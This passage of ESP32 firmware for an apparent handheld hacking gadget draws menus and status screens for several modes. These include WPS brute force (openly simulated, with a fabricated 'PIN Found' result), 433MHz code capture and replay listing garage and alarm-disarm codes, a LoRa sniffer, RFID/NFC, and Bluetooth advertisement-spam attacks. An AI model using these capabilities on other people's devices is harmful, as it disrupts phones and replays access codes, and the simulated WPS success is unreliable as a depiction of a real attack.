        int barLen = min(50, (int)(totalBeaconsSent / 100));
        DisplayHelper::drawRect(120, 82, barLen, 6, themeColors.warning);
    }

    // Probe bar
    char probeInfo[25];
    snprintf(probeInfo, sizeof(probeInfo), "Probe: %lu", totalProbesSent);
    DisplayHelper::drawText(probeInfo, 4, 90, themeColors.fg);
    if (totalProbesSent > 0) {
        int barLen = min(50, (int)(totalProbesSent / 100));
        DisplayHelper::drawRect(120, 90, barLen, 6, themeColors.secondary);
    }

    // Capture Statistics
    DisplayHelper::drawText("=== Captures ===", 4, 101, themeColors.secondary);

    char capturesInfo[50];
    snprintf(capturesInfo, sizeof(capturesInfo), "Handshakes: %lu  Creds: %lu",
             totalHandshakesCaptured, totalCredentialsCaptured);
    DisplayHelper::drawText(capturesInfo, 4, 111, themeColors.fg);

    // Memory usage indicator
    uint32_t freeHeap = ESP.getFreeHeap();
    uint32_t totalHeap = ESP.getHeapSize();
    int memPercent = ((totalHeap - freeHeap) * 100) / totalHeap;

    char ramInfo[20];
    snprintf(ramInfo, sizeof(ramInfo), "RAM: %d%% ", memPercent);
    DisplayHelper::drawText(ramInfo, 4, 120, themeColors.primary);

    // RAM bar
    int ramBar = (memPercent * 60) / 100;
    uint16_t ramColor = (memPercent > 80) ? themeColors.error :
                        (memPercent > 50) ? themeColors.warning : themeColors.success;
    DisplayHelper::drawBorder(50, 120, 62, 7, themeColors.fg);
    DisplayHelper::drawRect(51, 121, ramBar, 5, ramColor);

    // Footer
    DisplayHelper::drawText("[ESC] Back  [R] Reset Stats", 4, SCREEN_HEIGHT - 10, themeColors.secondary);
}

// ==================== WPS ATTACK ====================
void startWPSAttack() {
    currentMode = MODE_WPS_ATTACK;
    isWPSAttacking = false;
    wpsPinsTried = 0;
    wpsStartTime = millis();
    
    // Escanear redes WPS
    wpsVulnerableAPs = 0;
    scanWiFi();
    
    // Verificar quais têm WPS (simulado)
    for (int i = 0; i < networkCount; i++) {
        if (networks[i].rssi > -70) { // Sinal forte
            wpsVulnerableAPs++;
        }
    }
    
    drawWPSAttack();
    Serial.println("🔓 WPS Attack Mode");
}

// REFATORADO: Usa DisplayHelper para texto
void drawWPSAttack() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("WPS Pixie Dust Attack");

    char vulnInfo[40];
    snprintf(vulnInfo, sizeof(vulnInfo), "Vulnerable APs: %d", wpsVulnerableAPs);
    DisplayHelper::drawText(vulnInfo, 4, 20, themeColors.secondary);

    if (wpsTargetSSID.length() > 0) {
        char targetInfo[50];
        snprintf(targetInfo, sizeof(targetInfo), "Target: %s", wpsTargetSSID.c_str());
        DisplayHelper::drawText(targetInfo, 4, 35, themeColors.fg);

        char bssidInfo[50];
        snprintf(bssidInfo, sizeof(bssidInfo), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
            wpsTargetBSSID[0], wpsTargetBSSID[1], wpsTargetBSSID[2],
            wpsTargetBSSID[3], wpsTargetBSSID[4], wpsTargetBSSID[5]);
        DisplayHelper::drawText(bssidInfo, 4, 45, themeColors.fg);
    }

    char pinsInfo[40];
    snprintf(pinsInfo, sizeof(pinsInfo), "PINs Tried: %d / 11000", wpsPinsTried);
    DisplayHelper::drawText(pinsInfo, 4, 60, themeColors.fg);
    
    // Brute force progress bar
    if (isWPSAttacking) {
        int progress = map(wpsPinsTried, 0, 11000, 0, 200);
        M5.Display.drawRect(20, 70, 200, 12, TFT_WHITE);
        M5.Display.fillRect(21, 71, progress, 10, TFT_GREEN);
        
        // Progress percentage
        M5.Display.setTextColor(themeColors.primary, themeColors.bg);
        M5.Display.setCursor(90, 85);
        M5.Display.printf("%.1f%%", (wpsPinsTried / 11000.0) * 100);
        
        // Scrolling PIN numbers animation
        static int pinScroll = 0;
        pinScroll = (pinScroll + 1) % 10000;
        M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
        M5.Display.setCursor(70, 55);
        M5.Display.printf("Testing: %08d", 12345000 + pinScroll);
        
        // Attack activity indicator
        if (millis() % 200 < 100) {
            M5.Display.fillCircle(230, 75, 3, TFT_RED);
        }
    }
    
    char statusInfo[30];
    snprintf(statusInfo, sizeof(statusInfo), "Status: %s", isWPSAttacking ? "ATTACKING" : "STOPPED");
    DisplayHelper::drawText(statusInfo, 4, 95, isWPSAttacking ? TFT_GREEN : TFT_RED);
    
    // Lista de redes (compacta)
    if (!isWPSAttacking && networkCount > 0) {
        M5.Display.setTextColor(themeColors.primary, themeColors.bg);
        M5.Display.setCursor(4, 70);
        M5.Display.println("Select Target:");
        
        for (int i = 0; i < min(networkCount, 2); i++) {
            M5.Display.setTextColor(i == selectedNetwork ? TFT_BLACK : TFT_WHITE, 
                                     i == selectedNetwork ? TFT_GREEN : TFT_BLACK);
            M5.Display.printf(" %.20s\n", networks[i].ssid.c_str());
        }
    }
    
    M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
    M5.Display.setCursor(4, SCREEN_HEIGHT - 20);
    M5.Display.println("[ENTER] Select [SPACE] Attack");
    M5.Display.setCursor(4, SCREEN_HEIGHT - 10);
    M5.Display.println("[S] Scan [ESC] Back");
}

void updateWPSAttack() {
    if (!isWPSAttacking) return;
    
    // Simular tentativa de PIN
    if (millis() - wpsLastAttempt > 100) {
        wpsLastAttempt = millis();
        wpsPinsTried++;
        
        // Simular descoberta após 50 tentativas (demo)
        if (wpsPinsTried >= 50) {
            isWPSAttacking = false;
            M5.Display.clear(themeColors.bg);
            drawHeader("WPS SUCCESS!");
            M5.Display.setTextColor(themeColors.success, themeColors.bg);
            M5.Display.setCursor(4, 40);
            M5.Display.println("PIN Found: 12345670");
            M5.Display.println("PSK: WifiPassword123");
            delay(3000);
            drawWPSAttack();
        } else {
            drawWPSAttack();
        }
    }
}

void stopWPSAttack() {
    isWPSAttacking = false;
    Serial.println("🛑 WPS Attack stopped");
}

// ====================IR UNIVERSAL REMOTE ====================
void startIRRemote() {
    currentMode = MODE_IR_REMOTE;
    
    // Inicializar IR
    if (!irAvailable) {
        irSender = new IRsend(IR_TX_PIN);
        irReceiver = new IRrecv(IR_RX_PIN);
        irSender->begin();
        irReceiver->enableIRIn();
        irAvailable = true;
        
        // Códigos pre-programados comuns (TV Samsung exemplo)
        irCodes[0] = {"TV Power", "NEC", 0xE0E040BF, 32};
        irCodes[1] = {"TV Vol+", "NEC", 0xE0E0E01F, 32};
        irCodes[2] = {"TV Vol-", "NEC", 0xE0E0D02F, 32};
        irCodes[3] = {"TV Ch+", "NEC", 0xE0E048B7, 32};
        irCodes[4] = {"TV Ch-", "NEC", 0xE0E008F7, 32};
        irCodes[5] = {"TV Mute", "NEC", 0xE0E0F00F, 32};
        irCodes[6] = {"TV Menu", "NEC", 0xE0E058A7, 32};
        irCodes[7] = {"TV OK", "NEC", 0xE0E016E9, 32};
        irCodes[8] = {"AC Power", "COOLIX", 0xB27BE0, 24};
        irCodes[9] = {"AC Temp+", "COOLIX", 0xB2F740, 24};
        irCodeCount = 10;
    }
    
    drawIRRemote();
    Serial.println("🔴 IR Remote Started");
}

// REFATORADO: Usa DisplayHelper para texto
void drawIRRemote() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("IR Universal Remote");

    char modeInfo[40];
    snprintf(modeInfo, sizeof(modeInfo), "Mode: %s", irMode.c_str());
    DisplayHelper::drawText(modeInfo, 4, 20, themeColors.primary);

    char statusInfo[40];
    snprintf(statusInfo, sizeof(statusInfo), "Status: %s", isLearningIR ? "LEARNING" : "READY");
    DisplayHelper::drawText(statusInfo, 4, 30, themeColors.primary);
    
    // ===== ANIMATION: IR LED Pulse & Transmission Wave =====
    static unsigned long lastPulse = 0;
    static int pulseSize = 0;
    static bool isSending = false;
    static unsigned long sendTime = 0;
    
    // Trigger send animation when SPACE pressed
    if (M5.BtnA.wasPressed() && currentMode == MODE_IR_REMOTE) {
        isSending = true;
        sendTime = millis();
    }
    
    // LED pulse indicator (top-right corner at GPIO9 position)
    int ledX = 220, ledY = 25;
    
    if (isSending && (millis() - sendTime < 500)) {
        // Transmission wave - expanding rings
        int elapsed = millis() - sendTime;
        int radius1 = map(elapsed, 0, 500, 0, 40);
        int radius2 = map(elapsed, 0, 500, 0, 30);
        
        // Draw expanding circles with fade
        M5.Display.drawCircle(ledX, ledY, radius1, TFT_RED);
        if (radius2 > 5) M5.Display.drawCircle(ledX, ledY, radius2, TFT_ORANGE);
        
        // LED pulsing bright
        M5.Display.fillCircle(ledX, ledY, 4, TFT_RED);
        M5.Display.drawCircle(ledX, ledY, 5, TFT_YELLOW);
        
        // Draw IR beams
        for (int i = 0; i < 3; i++) {
            int beamX = ledX + radius1 - i * 10;
            M5.Display.drawFastHLine(beamX, ledY, 6, TFT_RED);
        }
        
        if (elapsed > 480) isSending = false;
    } else {
        // Idle breathing LED
        int brightness = 128 + sin(millis() / 500.0) * 127;
        uint16_t ledColor = M5.Display.color565(brightness / 2, 0, 0);
        M5.Display.fillCircle(ledX, ledY, 3, ledColor);
    }
    
    // Learning mode blink indicator
    if (isLearningIR) {
        if (millis() % 400 < 200) {
            M5.Display.fillRect(100, 22, 10, 10, TFT_GREEN);
            M5.Display.setTextColor(TFT_WHITE, TFT_GREEN);
        } else {
            M5.Display.setTextColor(themeColors.success, themeColors.bg);
        }
        M5.Display.setCursor(115, 23);
        M5.Display.print("LEARNING");
    }
    
    // Lista de códigos
    M5.Display.setTextColor(themeColors.fg, themeColors.bg);
    M5.Display.setCursor(4, 45);
    M5.Display.println("Codes:");
    
    int maxDisplay = min(irCodeCount, 5);
    for (int i = 0; i < maxDisplay; i++) {
        M5.Display.setTextColor(i == selectedIRCode ? TFT_BLACK : TFT_WHITE,
                                 i == selectedIRCode ? TFT_GREEN : TFT_BLACK);
        M5.Display.printf(" %s\n", irCodes[i].name.c_str());
    }
    
    M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
    M5.Display.setCursor(4, SCREEN_HEIGHT - 30);
    M5.Display.println("[SPACE] Send [L] Learn");
    M5.Display.setCursor(4, SCREEN_HEIGHT - 20);
    M5.Display.println("[M] Change Mode");
    M5.Display.setCursor(4, SCREEN_HEIGHT - 10);
    M5.Display.println("[ESC] Back");
}

void updateIRRemote() {
    if (isLearningIR) {
        decode_results results;
        if (irReceiver->decode(&results)) {
            learnedIRCode = results.value;
            
            // Adicionar código aprendido
            if (irCodeCount < MAX_IR_CODES) {
                irCodes[irCodeCount].name = "Learned " + String(irCodeCount);
                irCodes[irCodeCount].code = results.value;
                irCodes[irCodeCount].bits = results.bits;
                irCodes[irCodeCount].protocol = typeToString(results.decode_type);
                irCodeCount++;
                
                Serial.printf("✅ Learned: 0x%llX (%d bits)\n", results.value, results.bits);
            }
            
            isLearningIR = false;
            irReceiver->resume();
            drawIRRemote();
        }
    }
}

void stopIRRemote() {
    if (irReceiver) irReceiver->disableIRIn();
    Serial.println("🛑 IR Remote stopped");
}

// ==================== RF 433MHz ====================
void startRF433() {
    currentMode = MODE_RF433;
    
    // Inicializar RF 433MHz
    if (!rf433Available) {
        rfTransmitter = new RCSwitch();
        rfReceiver = new RCSwitch();
        rfTransmitter->enableTransmit(RF_TX_PIN);
        rfReceiver->enableReceive(digitalPinToInterrupt(RF_RX_PIN));
        rf433Available = true;
        
        // Códigos exemplo (garage doors comuns)
        rfCodes[0] = {"Garage A", 5393, 24, 350, "PT2262"};
        rfCodes[1] = {"Garage B", 5396, 24, 350, "PT2262"};
        rfCodes[2] = {"Alarm Arm", 1234567, 24, 300, "EV1527"};
        rfCodes[3] = {"Alarm Disarm", 1234568, 24, 300, "EV1527"};
        rfCodes[4] = {"Doorbell", 987654, 24, 400, "Fixed"};
        rfCodeCount = 5;
    }
    
    drawRF433();
    Serial.println("📡 RF 433MHz Started");
}

// REFATORADO: Usa DisplayHelper para texto, mantém animações nativas
void drawRF433() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("RF 433MHz");

    char statusInfo[30];
    snprintf(statusInfo, sizeof(statusInfo), "Status: %s", isCapturingRF ? "CAPTURING" : "READY");
    DisplayHelper::drawText(statusInfo, 4, 20, themeColors.primary);

    char capturedInfo[30];
    snprintf(capturedInfo, sizeof(capturedInfo), "Captured: %d codes", rfCodeCount);
    DisplayHelper::drawText(capturedInfo, 4, 30, themeColors.primary);
    
    // ===== ANIMATION: 433MHz Signal Waves & Transmission =====
    static unsigned long lastRFAnimation = 0;
    static int waveOffset = 0;
    static bool isSendingRF = false;
    static unsigned long rfSendTime = 0;
    static bool captureSparkle = false;
    
    // Trigger send animation
    if (M5.BtnA.wasPressed() && currentMode == MODE_RF433) {
        isSendingRF = true;
        rfSendTime = millis();
    }
    
    // Frequency indicator - always show 433MHz wave
    int freqY = 40;
    DisplayHelper::drawText("433MHz", 160, freqY - 8, themeColors.primary);
    
    // Draw sine wave visualization
    if (millis() - lastRFAnimation > 20) {
        waveOffset = (waveOffset + 2) % 40;
        lastRFAnimation = millis();
    }
    
    for (int x = 0; x < 80; x++) {
        int y = freqY + sin((x + waveOffset) * 0.3) * 6;
        M5.Display.drawPixel(160 + x, y, TFT_CYAN);
    }
    
    // Transmission burst animation
    if (isSendingRF && (millis() - rfSendTime < 400)) {
        int elapsed = millis() - rfSendTime;
        
        // Signal strength burst bars
        for (int i = 0; i < 5; i++) {
            int barHeight = map(elapsed, 0, 400, 20, 2);
            int barY = freqY + (i - 2) * 8;
            int barWidth = map(i, 0, 4, 15, 5);
            M5.Display.fillRect(140 - barWidth, barY - barHeight / 2, barWidth, barHeight, TFT_ORANGE);
        }
        
        // Expanding transmission circles
        int radius = map(elapsed, 0, 400, 5, 35);
        M5.Display.drawCircle(180, freqY, radius, TFT_RED);
        if (radius > 15) M5.Display.drawCircle(180, freqY, radius - 15, TFT_YELLOW);
        
        // Antenna icon with burst
        M5.Display.drawFastVLine(180, freqY - 10, 10, TFT_WHITE);
        M5.Display.fillCircle(180, freqY - 11, 2, TFT_RED);
        
        if (elapsed > 380) isSendingRF = false;
    }
    
    // Capture sparkle effect
    if (isCapturingRF) {
        // Blinking capture indicator
        if (millis() % 300 < 150) {
            M5.Display.fillRect(95, 20, 8, 8, TFT_GREEN);
            M5.Display.setTextColor(TFT_BLACK, TFT_GREEN);
        } else {
            M5.Display.setTextColor(themeColors.success, themeColors.bg);
        }
        M5.Display.setCursor(105, 20);
        M5.Display.print("CAPTURING");
        
        // Random sparkles when receiving
        if (millis() % 100 < 50) {
            int sparkX = 160 + random(-30, 30);
            int sparkY = freqY + random(-15, 15);
            M5.Display.fillCircle(sparkX, sparkY, 1, TFT_YELLOW);
        }
    }
    
    // Lista de códigos
    DisplayHelper::drawText("Codes:", 4, 68, themeColors.fg);

    int maxDisplay = min(rfCodeCount, 4);
    int listY = 78;
    for (int i = 0; i < maxDisplay; i++) {
        bool isSelected = (i == selectedRFCode);
        uint32_t textColor = isSelected ? TFT_BLACK : TFT_WHITE;
        uint32_t bgColor = isSelected ? TFT_GREEN : themeColors.bg;

        if (isSelected) {
            M5.Display.fillRect(0, listY, SCREEN_WIDTH, 10, bgColor);
        }

        char codeInfo[50];
        snprintf(codeInfo, sizeof(codeInfo), " %s (%lu)", rfCodes[i].name.c_str(), rfCodes[i].code);
        DisplayHelper::drawText(codeInfo, 4, listY, textColor);
        listY += 10;
    }

    DisplayHelper::drawText("[SPACE] Send [C] Capture", 4, SCREEN_HEIGHT - 30, themeColors.secondary);
    DisplayHelper::drawText("[S] Save to SD", 4, SCREEN_HEIGHT - 20, themeColors.secondary);
    DisplayHelper::drawText("[ESC] Back", 4, SCREEN_HEIGHT - 10, themeColors.secondary);
}

void updateRF433() {
    if (isCapturingRF && rfReceiver->available()) {
        unsigned long code = rfReceiver->getReceivedValue();
        if (code != 0 && rfCodeCount < MAX_RF_CODES) {
            rfCodes[rfCodeCount].name = "RF_" + String(rfCodeCount);
            rfCodes[rfCodeCount].code = code;
            rfCodes[rfCodeCount].bitLength = rfReceiver->getReceivedBitlength();
            rfCodes[rfCodeCount].pulseLength = rfReceiver->getReceivedDelay();
            rfCodes[rfCodeCount].protocol = "Protocol " + String(rfReceiver->getReceivedProtocol());
            rfCodeCount++;
            
            Serial.printf("📡 Captured: %lu (%d bits)\n", code, rfReceiver->getReceivedBitlength());
            drawRF433();
        }
        rfReceiver->resetAvailable();
    }
}

void stopRF433() {
    if (rfReceiver) rfReceiver->disableReceive();
    isCapturingRF = false;
    Serial.println("🛑 RF 433MHz stopped");
}

// ==================== LORA SCANNER ====================
void startLoRaScanner() {
    currentMode = MODE_LORA_SCANNER;
    
    // Inicializar LoRa
    if (!loraAvailable) {
        SPI.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_CS);
        LoRa.setPins(LORA_CS, LORA_RST, LORA_IRQ);
        
        if (LoRa.begin(LORA_FREQUENCY)) {
            LoRa.setSpreadingFactor(7);
            LoRa.setSignalBandwidth(125E3);
            LoRa.setCodingRate4(5);
            LoRa.setSyncWord(0x12);
            loraAvailable = true;
            Serial.println("✅ LoRa initialized");
        } else {
            Serial.println("❌ LoRa init failed");
        }
    }
    
    isScanningLoRa = true;
    loraDeviceCount = 0;
    drawLoRaScanner();
    Serial.println("🛰️ LoRa Scanner Started");
}

// REFATORADO: Usa DisplayHelper para texto, mantém animações nativas
void drawLoRaScanner() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("LoRa Scanner");

    char freqInfo[30];
    snprintf(freqInfo, sizeof(freqInfo), "Freq: %.1f MHz", LORA_FREQUENCY / 1E6);
    DisplayHelper::drawText(freqInfo, 4, 20, themeColors.primary);

    char devicesInfo[30];
    snprintf(devicesInfo, sizeof(devicesInfo), "Devices: %d", loraDeviceCount);
    DisplayHelper::drawText(devicesInfo, 4, 30, themeColors.primary);

    char packetsInfo[30];
    snprintf(packetsInfo, sizeof(packetsInfo), "Packets: %d", loraPacketsReceived);
    DisplayHelper::drawText(packetsInfo, 4, 40, themeColors.primary);

    // Status com animação
    char statusInfo[40];
    snprintf(statusInfo, sizeof(statusInfo), "Status: %s", loraAvailable ? "ACTIVE" : "NO HARDWARE");
    DisplayHelper::drawText(statusInfo, 4, 50, loraAvailable ? TFT_GREEN : TFT_RED);
    
    // Packet rain animation (packets falling from sky)
    if (isScanningLoRa && loraAvailable) {
        static int rainDrops[5] = {0, 10, 20, 30, 40};
        static unsigned long lastRain = 0;
        
        if (millis() - lastRain > 100) {
            for (int i = 0; i < 5; i++) {
                rainDrops[i] = (rainDrops[i] + 5) % 60;
            }
            lastRain = millis();
        }
        
        for (int i = 0; i < 5; i++) {
            int dropX = 180 + i * 10;
            int dropY = 20 + rainDrops[i];
            M5.Display.setTextColor(themeColors.primary, themeColors.bg);
            M5.Display.setCursor(dropX, dropY);
            M5.Display.print("↓");
        }
    }
    
    if (loraAvailable && loraDeviceCount > 0) {
        DisplayHelper::drawText("Devices:", 4, 68, themeColors.fg);

        int maxDisplay = min(loraDeviceCount, 4);
        int listY = 78;
        for (int i = 0; i < maxDisplay; i++) {
            bool isSelected = (i == selectedLoRaDevice);
            uint32_t textColor = isSelected ? TFT_BLACK : TFT_WHITE;
            uint32_t bgColor = isSelected ? TFT_GREEN : themeColors.bg;

            if (isSelected) {
                M5.Display.fillRect(0, listY, SCREEN_WIDTH, 10, bgColor);
            }

            // RSSI signal bars
            int rssi = loraDevices[i].rssi;
            int bars = map(constrain(rssi, -120, -30), -120, -30, 1, 5);

            char signalBars[10] = "";
            for (int b = 0; b < 5; b++) {
                strcat(signalBars, (b < bars ? "▰" : "▱"));
            }

            char deviceInfo[60];
            snprintf(deviceInfo, sizeof(deviceInfo), " %s %s", loraDevices[i].name.c_str(), signalBars);
            DisplayHelper::drawText(deviceInfo, 4, listY, textColor);

            // Ping indicator for recently seen devices
            if (millis() - loraDevices[i].lastSeen < 1000) {
                M5.Display.fillCircle(220, listY + 4, 2, TFT_CYAN);
            }

            listY += 10;
        }
    }

    DisplayHelper::drawText("[SPACE] Toggle Scan", 4, SCREEN_HEIGHT - 20, themeColors.secondary);
    DisplayHelper::drawText("[ESC] Back", 4, SCREEN_HEIGHT - 10, themeColors.secondary);
}

void updateLoRaScanner() {
    if (!loraAvailable || !isScanningLoRa) return;
    
    // Check for packets
    int packetSize = LoRa.parsePacket();
    if (packetSize) {
        loraPacketsReceived++;
        
        String payload = "";
        while (LoRa.available()) {
            payload += (char)LoRa.read();
        }
        
        int rssi = LoRa.packetRssi();
        float snr = LoRa.packetSnr();
        
        // Add device if new
        if (loraDeviceCount < MAX_LORA_DEVICES) {
            bool found = false;
            for (int i = 0; i < loraDeviceCount; i++) {
                if (loraDevices[i].rssi == rssi) { // Simple match
                    loraDevices[i].lastSeen = millis();
                    loraDevices[i].packetCount++;
                    found = true;
                    break;
                }
            }
            
            if (!found) {
                loraDevices[loraDeviceCount].name = "LoRa_" + String(loraDeviceCount);
                loraDevices[loraDeviceCount].rssi = rssi;
                loraDevices[loraDeviceCount].snr = snr;
                loraDevices[loraDeviceCount].lastSeen = millis();
                loraDevices[loraDeviceCount].packetCount = 1;
                loraDeviceCount++;
            }
        }
        
        Serial.printf("📦 Packet: RSSI=%d SNR=%.1f Size=%d\n", rssi, snr, packetSize);
        drawLoRaScanner();
    }
}

void stopLoRaScanner() {
    isScanningLoRa = false;
    Serial.println("🛑 LoRa Scanner stopped");
}

// ==================== RFID/NFC MODULE ====================
void startRFIDNFC() {
    currentMode = MODE_RFID_NFC;
    
    // Initialize RFID module if not already done
    if (rfidModule == nullptr) {
        rfidModule = new M5GotchiRFIDNFC();
        rfidModule->init();
        
        // Note: Module will display its own error messages if hardware is not found
        // Hardware connection guide:
        // PN532 (I2C): SDA=21 (G21), SCL=22 (G22), VCC=5V, GND=GND
        // RC522 (SPI): MOSI=23 (G23), MISO=19 (G19), SCK=18 (G18), CS=5 (G5), RST=26, VCC=3.3V, GND=GND
        // RDM6300 (UART): RX=16 (G16), VCC=5V, GND=GND
    }
    
    drawRFIDNFC();
    Serial.println("🎴 RFID/NFC Module Started");
}

void drawRFIDNFC() {
    if (rfidModule == nullptr) return;
    
    // Module handles its own drawing via update()
    // No need to clear display here
}

void updateRFIDNFC() {
    if (rfidModule == nullptr) return;
    rfidModule->update();
}

void stopRFIDNFC() {
    if (rfidModule) {
        // Module cleanup handled by class destructor
        Serial.println("🛑 RFID/NFC Module stopped");
    }
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== BLUETOOTH ATTACKS MODULE ====================
void startBluetooth() {
    currentMode = MODE_BLUETOOTH;
    
    // Initialize Bluetooth module if not already done
    if (bleModule == nullptr) {
        bleModule = new BluetoothAttacks();
        if (!bleModule->begin()) {
            M5.Display.clear(themeColors.bg);
            drawHeader("Bluetooth Error");
            M5.Display.setTextColor(themeColors.error, themeColors.bg);
            M5.Display.setCursor(4, 50);
            M5.Display.println("BLE init failed!");
            M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
            M5.Display.setCursor(4, 70);
            M5.Display.println("NimBLE stack error");
            delay(2000);
            delete bleModule;
            bleModule = nullptr;
            currentMode = MODE_MENU;
            drawMenu();
            return;
        }
    }
    
    drawBluetooth();
    Serial.println("🔵 Bluetooth Attacks Module Started");
}

// REFATORADO: Usa DisplayHelper para menu limpo
void drawBluetooth() {
    if (bleModule == nullptr) return;

    DisplayHelper::clear(themeColors.bg);
    drawHeader("Bluetooth Attacks");

    const char* attacks[] = {
        "1. Sour Apple (iOS)",
        "2. Samsung Spam",
        "3. Google Fast Pair",
        "4. Microsoft Swift",
        "5. Spam All",
        "0. Stop & Back"
    };

    for (int i = 0; i < 6; i++) {
        DisplayHelper::drawText(attacks[i], 4, 30 + i * 12, themeColors.fg);
    }

    // Status info
    if (bleModule->isRunning()) {
        DisplayHelper::drawText("Status: ATTACKING", 4, 100, themeColors.primary);

        char packetsInfo[40];
        snprintf(packetsInfo, sizeof(packetsInfo), "Packets: %lu", bleModule->getPacketsSent());
        DisplayHelper::drawText(packetsInfo, 4, 112, themeColors.success);
    } else {
        DisplayHelper::drawText("Status: Ready", 4, 100, themeColors.primary);
    }

    drawStatusBar();
}

void updateBluetooth() {
    if (bleModule == nullptr) return;
    
    // Execute current attack if running
    if (bleModule->isRunning()) {
        // Execute specific attack based on current type
        BLEAttackType attack = bleModule->getCurrentAttack();
        switch (attack) {
            case BLE_ATTACK_SOUR_APPLE:
                bleModule->executeSourApple();
                break;
            case BLE_ATTACK_SAMSUNG:
                bleModule->executeSamsungSpam();
                break;
            case BLE_ATTACK_GOOGLE:
                bleModule->executeGoogleSpam();
                break;
            case BLE_ATTACK_MICROSOFT:
                bleModule->executeMicrosoftSpam();
                break;
            case BLE_ATTACK_ALL:
                // Spam all rotates automatically between all types
                bleModule->executeSourApple();
                break;
        }
        
        // Refresh display every second
        static unsigned long lastRefresh = 0;
        if (millis() - lastRefresh > 1000) {
            drawBluetooth();
            lastRefresh = millis();
        }
    }
}

void stopBluetooth() {
    if (bleModule) {
        bleModule->stop();
        Serial.println("🛑 Bluetooth Attacks stopped");
    }
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== NEKO VIRTUAL PET ====================
void startNekoPet() {
    M5.Display.clear(themeColors.bg);
    drawHeader("🐱 Neko Pet");
    
    if (!nekoPet) {
        nekoPet = new M5GotchiNekoVirtualPet();
        nekoPet->init();
        addLog(LOG_INFO, "Neko Pet initialized");
    }
    
    currentMode = MODE_NEKO_PET;
    nekoPet->start();
    Serial.println("🐱 Neko Virtual Pet started");
}

void drawNekoPet() {
    if (nekoPet) {
        nekoPet->drawPetScreen();
    }
}

void updateNekoPet() {
    if (nekoPet) {
        nekoPet->update();
        
        // Check for ESC to exit (handled in main loop ESC handler)
        // Pet updates its own display internally
        static unsigned long lastRefresh = 0;
        if (millis() - lastRefresh > 100) {
            drawNekoPet();
            lastRefresh = millis();
        }
    }
}

void stopNekoPet() {
    if (nekoPet) {
        // Pet auto-saves on stop
        Serial.println("🐱 Neko Pet stopped");
    }
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== TUTORIAL SYSTEM ====================
void startTutorial() {
    M5.Display.clear(themeColors.bg);
    drawHeader("📚 Tutorial");
    
    if (!tutorialSystem) {
        tutorialSystem = new TutorialSystem();
        tutorialSystem->init();
        addLog(LOG_INFO, "Tutorial System initialized");
    }
    
    currentMode = MODE_TUTORIAL;
    tutorialSystem->startWizard();
    Serial.println("📚 Tutorial started");
}

void drawTutorial() {
    if (tutorialSystem) {
        tutorialSystem->drawCurrentStep();
    }
}

void updateTutorial() {
    if (tutorialSystem) {
        tutorialSystem->update();
        
        // Auto-refresh display
        static unsigned long lastRefresh = 0;
        if (millis() - lastRefresh > 100) {
            drawTutorial();
            lastRefresh = millis();
        }
    }
}

void stopTutorial() {
    if (tutorialSystem) {
        Serial.println("📚 Tutorial stopped");
    }
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== ACHIEVEMENT SYSTEM ====================
void startAchievements() {
    M5.Display.clear(themeColors.bg);
    drawHeader("🏆 Achievements");
    
    if (!achievementManager) {
        achievementManager = new AchievementManager();
        achievementManager->init();
        addLog(LOG_INFO, "Achievement Manager initialized");
    }
    
    currentMode = MODE_ACHIEVEMENTS;
    Serial.println("🏆 Achievements viewer started");
}

void drawAchievements() {
    M5.Display.clear(themeColors.bg);
    drawHeader("🏆 Achievements");
    
    if (!achievementManager) return;
    
    M5.Display.setTextColor(themeColors.fg, themeColors.bg);
    M5.Display.setCursor(4, 24);
    
    // Display achievement stats
    uint8_t total = achievementManager->getCount();
    uint8_t unlocked = achievementManager->countUnlocked();
    uint16_t points = achievementManager->getStats().totalPoints;
    
    M5.Display.printf("Progress: %d/%d (%d%%)\n", unlocked, total, (unlocked * 100) / max(total, (uint8_t)1));
    M5.Display.printf("Points: %d\n\n", points);
    
    // Display categories
    M5.Display.println("Categories:");
    M5.Display.println("  [H] Hacking");
    M5.Display.println("  [G] Gaming");
    M5.Display.println("  [K] Kawaii");
    M5.Display.println("  [S] Sound");
    M5.Display.println("  [D] Data");
    M5.Display.println("  [F] Social");
    M5.Display.println("  [X] Secret");
    
    M5.Display.setCursor(4, SCREEN_HEIGHT - 12);
    M5.Display.setTextColor(themeColors.primary, themeColors.bg);
    M5.Display.print("[ESC] Back");
    
    drawStatusBar();
}

void updateAchievements() {
    // Simple viewer, no complex updates needed
    static unsigned long lastRefresh = 0;
    if (millis() - lastRefresh > 1000) {
        drawAchievements();
        lastRefresh = millis();
    }
}

void stopAchievements() {
    Serial.println("🏆 Achievements viewer stopped");
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== SYSTEM INFO ====================
void showSystemInfo() {
    M5.Display.clear(themeColors.bg);
    drawHeader("System Info");
    
    M5.Display.setTextColor(themeColors.fg, themeColors.bg);
    M5.Display.setCursor(4, 24);
    M5.Display.printf("Chip: %s\n", ESP.getChipModel());
    M5.Display.printf("Cores: %d @ %d MHz\n", ESP.getChipCores(), ESP.getCpuFreqMHz());
    
    // ===== ANIMATION: Memory Bar Graphs & CPU Usage =====
    uint32_t totalHeap = ESP.getHeapSize();
    uint32_t freeHeap = ESP.getFreeHeap();
    uint32_t usedHeap = totalHeap - freeHeap;
    uint32_t flashSize = ESP.getFlashChipSize();
    uint32_t usedFlash = ESP.getSketchSize();
    
    // RAM usage bar graph
    M5.Display.setCursor(4, 50);
    M5.Display.setTextColor(themeColors.primary, themeColors.bg);
    M5.Display.print("RAM: ");
    int ramPercent = (usedHeap * 100) / totalHeap;
    M5.Display.printf("%d KB / %d KB (%d%%)", usedHeap / 1024, totalHeap / 1024, ramPercent);
    
    // Horizontal bar graph for RAM
    int barWidth = 220;
    int barX = 10, barY = 62;
    M5.Display.drawRect(barX - 1, barY - 1, barWidth + 2, 12, TFT_WHITE);
    int ramBar = (ramPercent * barWidth) / 100;
